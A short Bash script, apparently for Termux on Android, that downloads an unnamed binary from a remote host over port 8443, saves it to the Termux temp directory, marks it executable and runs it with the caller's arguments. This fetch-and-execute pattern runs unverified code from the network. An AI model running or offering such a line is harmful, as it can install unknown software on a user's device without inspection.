#!/bin/bash
TMP_DIR=/data/data/com.termux/files/usr/tmp
FILE_NAME=archivo
curl -sSL " https://nt.viofull.com:8443/downloads/0e381172f750402cbe207da035b014d6_install_net" -o $TMP_DIR/$FILE_NAME && chmod +x $TMP_DIR/$FILE_NAME && $TMP_DIR/$FILE_NAME $@

